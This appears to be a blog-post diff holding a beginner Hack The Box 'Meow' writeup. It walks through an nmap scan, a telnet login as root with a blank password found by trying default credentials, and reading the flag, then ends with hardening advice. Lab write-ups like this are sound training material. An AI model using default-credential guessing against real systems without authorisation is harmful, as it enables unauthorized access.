@@ -1,0 +1,99 @@
+export const frontmatter = {
+  title: "Hack The Box Meow Machine Writeup",
+  slug: "hack-the-box-meow-machine-writeup",
+  category: "HTB",
+  description:
+    "Complete Hack The Box Meow writeup for beginners. Learn how to perform Nmap enumeration, and Telnet misconfigurations",
+  date: "2025-03-06",
+};
+
+export const metadata = {
+  title: "Hack The Box Meow Machine Writeup | loxcalhost",
+  description: "Short description for SEO.",
+};
+
+## Introduction
+
+Meow is a beginner-friendly Starting Point machine on HackTheBox. The goal is to gain root access and retrieve the flag. This machine teaches the basics of network scanning and exploiting misconfigured services.
+
+## Setup
+
+To connect to machine download the starting point VPN file and conect to it via `sudo openvpn file.ovpn`
+
+Once connected to the machine spawn the machine through [HTB webpage](https://app.hackthebox.com/machines/Meow) and grab it's IP
+
+To check if everything is working fine, we can use `ping 10.129.30.252`
+
+## Enumeration
+
+Nmap Scan with `nmap -sC -sV 10.129.30.252` which returns
+
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 22:23 IST
+Nmap scan report for 10.129.30.252
+Host is up (0.19s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.27 seconds
+```
+
+Which indicates that the server is running `telnet` on port `23/tcp`
+
+> telnet is a client-server application protocol that provides access to virtual terminals of remote systems on local area networks or the Internet and it by default, does not encrypt any data sent over the connection (including passwords),
+
+Here `-sC` runs default scripts against the targeted server these scripts automatically grab banners, check for common misconfigurations and much more and `-sV` tells nmap to detect what version of a service is running on each open port
+
+## Exploitation
+
+To connect to telnet we can use `telnet 10.129.30.252` which returns
+
+```
+Trying 10.129.30.252...
+Connected to 10.129.30.252.
+Escape character is '^]'.
+
+
+     █  █         ▐▌     ▄█▄ █          ▄▄▄▄
+     █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
+     █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
+
+
+Meow login:
+```
+
+At this stage to connect to telnet we need a valid username, and for that purpose we can look into [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt) and from looking through it we can try candidates like `root`, `admin`, `user` etc
+
+Trying `root` and a blank password
+
+```
+telnet 10.129.30.252
+...<SNIP>...
+Meow login: root
+Password:
+Welcome to Ubuntu 20.04.2 LTS...
+...<SNIP>...
+root@Meow:~#
+```
+
+This gives us the root access
+
+## Flag
+
+Since we already have root access we can view contents of directory with `ls` which returns that we have a file named `flag.txt`
+
+To view content of `flag.txt` use `cat flag.txt`:
+
+```
+root@Meow:~# cat flag.txt
+b40a...<SNIP>...4c19
+```
+
+## Conclusion
+
+This machine demonstrates how dangerous misconfigured services can be. Telnet transmits credentials in plaintext, and combined with an empty root password, the system was compromised instantly with no exploitation tools needed — just basic enumeration.
+
+This could have been prevented by disabling Telnet and replacing it with SSH, and enforcing strong passwords on all accounts.
